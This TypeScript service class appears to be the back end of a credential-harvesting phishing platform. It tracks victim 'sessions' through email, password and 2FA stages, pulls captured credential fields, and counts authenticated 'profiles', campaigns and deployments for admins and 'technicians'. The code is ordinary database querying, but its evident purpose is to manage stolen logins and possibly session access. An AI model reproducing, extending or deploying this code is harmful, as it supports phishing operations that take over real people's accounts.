import prisma from '../config/database';
import { logger } from '../utils/logger.util';

export class MonitoringService {
  /**
   * Get all active sessions (real-time monitoring)
   */
  async getActiveSessions(userId?: string, isAdmin: boolean = false) {
    try {
      const where: any = {
        status: { in: ['INITIATED', 'EMAIL_ENTERED', 'PASSWORD_ENTERED', '2FA_REQUIRED'] },
      };

      // Technicians only see their own sessions
      if (!isAdmin && userId) {
        where.userId = userId;
      }

      const sessions = await prisma.session.findMany({
        where,
        include: {
          campaign: {
            select: {
              id: true,
              name: true,
              captureId: true,
              provider: true,
            },
          },
        },
        orderBy: { startedAt: 'desc' },
        take: 100,
      });

      return {
        success: true,
        sessions,
        total: sessions.length,
      };
    } catch (error: any) {
      logger.error('Get active sessions error:', error.message);
      throw error;
    }
  }

  /**
   * Get all sessions with filters
   */
  async getAllSessions(filters: {
    userId?: string;
    campaignId?: string;
    status?: string;
    email?: string;
    isAdmin?: boolean;
  }) {
    try {
      const where: any = {};

      if (!filters.isAdmin && filters.userId) {
        where.userId = filters.userId;
      }

      if (filters.campaignId) {
        where.campaignId = filters.campaignId;
      }

      if (filters.status) {
        where.status = filters.status;
      }

      if (filters.email) {
        where.email = { contains: filters.email };
      }

      const sessions = await prisma.session.findMany({
        where,
        include: {
          campaign: {
            select: {
              id: true,
              name: true,
              captureId: true,
              provider: true,
              User: {
                select: {
                  id: true,
                  email: true,
                  fullName: true,
                },
              },
            },
          },
        },
        orderBy: { startedAt: 'desc' },
        take: 500,
      });

      return {
        success: true,
        sessions,
        total: sessions.length,
      };
    } catch (error: any) {
      logger.error('Get all sessions error:', error.message);
      throw error;
    }
  }

  /**
   * Get session by ID
   */
  async getSessionById(sessionId: string, userId?: string, isAdmin: boolean = false) {
    try {
      const session = await prisma.session.findUnique({
        where: { id: sessionId },
        include: {
          campaign: {
            include: {
              User: {
                select: {
                  id: true,
                  email: true,
                  fullName: true,
                },
              },
            },
          },
        },
      });

      if (!session) {
        throw new Error('Session not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && userId && session.userId !== userId) {
        throw new Error('Access denied - not session owner');
      }

      return {
        success: true,
        session,
      };
    } catch (error: any) {
      logger.error('Get session by ID error:', error.message);
      throw error;
    }
  }

  /**
   * Get credential fields for session
   */
  async getSessionCredentials(sessionId: string, userId?: string, isAdmin: boolean = false) {
    try {
      // Verify session ownership first
      const session = await prisma.session.findUnique({
        where: { id: sessionId },
      });

      if (!session) {
        throw new Error('Session not found');
      }

      if (!isAdmin && userId && session.userId !== userId) {
        throw new Error('Access denied - not session owner');
      }

      const credentials = await prisma.credentialField.findMany({
        where: { sessionId },
        orderBy: { capturedAt: 'asc' },
      });

      return {
        success: true,
        credentials,
      };
    } catch (error: any) {
      logger.error('Get session credentials error:', error.message);
      throw error;
    }
  }

  /**
   * Get all profiles
   */
  async getAllProfiles(filters: {
    userId?: string;
    campaignId?: string;
    authStatus?: string;
    isLaunched?: boolean;
    email?: string;
    isAdmin?: boolean;
  }) {
    try {
      const where: any = {};

      if (!filters.isAdmin && filters.userId) {
        where.userId = filters.userId;
      }

      if (filters.campaignId) {
        where.campaignId = filters.campaignId;
      }

      if (filters.authStatus) {
        where.authStatus = filters.authStatus;
      }

      if (filters.isLaunched !== undefined) {
        where.isLaunched = filters.isLaunched;
      }

      if (filters.email) {
        where.email = { contains: filters.email };
      }

      const profiles = await prisma.profile.findMany({
        where,
        include: {
          campaign: {
            select: {
              id: true,
              name: true,
              captureId: true,
              provider: true,
              User: {
                select: {
                  id: true,
                  email: true,
                  fullName: true,
                },
              },
            },
          },
        },
        orderBy: { capturedAt: 'desc' },
        take: 500,
      });

      return {
        success: true,
        profiles,
        total: profiles.length,
      };
    } catch (error: any) {
      logger.error('Get all profiles error:', error.message);
      throw error;
    }
  }

  /**
   * Get profile by ID
   */
  async getProfileById(profileId: string, userId?: string, isAdmin: boolean = false) {
    try {
      const profile = await prisma.profile.findUnique({
        where: { id: profileId },
        include: {
          campaign: {
            include: {
              User: {
                select: {
                  id: true,
                  email: true,
                  fullName: true,
                },
              },
            },
          },
        },
      });

      if (!profile) {
        throw new Error('Profile not found');
      }

      // Check ownership (unless admin)
      if (!isAdmin && userId && profile.userId !== userId) {
        throw new Error('Access denied - not profile owner');
      }

      return {
        success: true,
        profile,
      };
    } catch (error: any) {
      logger.error('Get profile by ID error:', error.message);
      throw error;
    }
  }

  /**
   * Get platform statistics (admin dashboard)
   */
  async getPlatformStats() {
    try {
      const [
        totalUsers,
        activeUsers,
        pendingUsers,
        totalCampaigns,
        activeCampaigns,
        totalSessions,
        activeSessions,
        completedSessions,
        totalProfiles,
        authenticatedProfiles,
        totalDeployments,
        activeDeployments,
      ] = await Promise.all([
        prisma.user.count(),
        prisma.user.count({ where: { status: 'ACTIVE' } }),
        prisma.user.count({ where: { status: 'PENDING' } }),
        prisma.campaign.count(),
        prisma.campaign.count({ where: { status: 'ACTIVE' } }),
        prisma.session.count(),
        prisma.session.count({
          where: {
            status: { in: ['INITIATED', 'EMAIL_ENTERED', 'PASSWORD_ENTERED', '2FA_REQUIRED'] },
          },
        }),
        prisma.session.count({ where: { status: 'COMPLETED' } }),
        prisma.profile.count(),
        prisma.profile.count({ where: { authStatus: 'AUTHENTICATED' } }),
        prisma.deployment.count(),
        prisma.deployment.count({ where: { deploymentStatus: 'DEPLOYED' } }),
      ]);

      return {
        success: true,
        stats: {
          users: {
            total: totalUsers,
            active: activeUsers,
            pending: pendingUsers,
          },
          campaigns: {
            total: totalCampaigns,
            active: activeCampaigns,
          },
          sessions: {
            total: totalSessions,
            active: activeSessions,
            completed: completedSessions,
          },
          profiles: {
            total: totalProfiles,
            authenticated: authenticatedProfiles,
          },
          deployments: {
            total: totalDeployments,
            active: activeDeployments,
          },
        },
      };
    } catch (error: any) {
      logger.error('Get platform stats error:', error.message);
      throw error;
    }
  }

  /**
   * Get user statistics (technician dashboard)
   */
  async getUserStats(userId: string) {
    try {
      const [
        totalCampaigns,
        activeCampaigns,
        totalSessions,
        activeSessions,
        completedSessions,
        totalProfiles,
        authenticatedProfiles,
        totalDeployments,
        activeDeployments,
      ] = await Promise.all([
        prisma.campaign.count({ where: { userId } }),
        prisma.campaign.count({ where: { userId, status: 'ACTIVE' } }),
        prisma.session.count({ where: { userId } }),
        prisma.session.count({
          where: {
            userId,
            status: { in: ['INITIATED', 'EMAIL_ENTERED', 'PASSWORD_ENTERED', '2FA_REQUIRED'] },
          },
        }),
        prisma.session.count({ where: { userId, status: 'COMPLETED' } }),
        prisma.profile.count({ where: { userId } }),
        prisma.profile.count({ where: { userId, authStatus: 'AUTHENTICATED' } }),
        prisma.deployment.count({ where: { userId } }),
        prisma.deployment.count({ where: { userId, deploymentStatus: 'DEPLOYED' } }),
      ]);

      return {
        success: true,
        stats: {
          campaigns: {
            total: totalCampaigns,
            active: activeCampaigns,
          },
          sessions: {
            total: totalSessions,
            active: activeSessions,
            completed: completedSessions,
          },
          profiles: {
            total: totalProfiles,
            authenticated: authenticatedProfiles,
          },
          deployments: {
            total: totalDeployments,
            active: activeDeployments,
          },
        },
      };
    } catch (error: any) {
      logger.error('Get user stats error:', error.message);
      throw error;
    }
  }

  /**
   * Delete profile (admin only)
   */
  async deleteProfile(profileId: string) {
    try {
      const profile = await prisma.profile.findUnique({
        where: { id: profileId },
      });

      if (!profile) {
        throw new Error('Profile not found');
      }

      await prisma.profile.delete({
        where: { id: profileId },
      });

      logger.success(`Profile deleted: ${profileId}`);

      return {
        success: true,
        message: 'Profile deleted successfully',
      };
    } catch (error: any) {
      logger.error('Delete profile error:', error.message);
      throw error;
    }
  }
}

export default new MonitoringService();
